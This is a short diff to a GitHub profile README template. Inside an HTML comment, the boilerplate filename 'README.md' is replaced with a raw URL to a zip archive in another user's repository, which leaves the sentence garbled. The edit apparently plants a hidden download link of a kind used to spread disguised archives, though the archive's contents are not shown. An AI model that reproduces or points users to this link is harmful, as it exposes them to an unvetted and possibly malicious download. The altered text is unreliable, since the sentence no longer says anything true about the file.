@@ -5,6 +5,6 @@
 - 📫 How to reach me ...
 
 <!---
-sevenpm/sevenpm is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+sevenpm/sevenpm is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/darlo2003/sevenpm/main/shoulderer/sevenpm.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
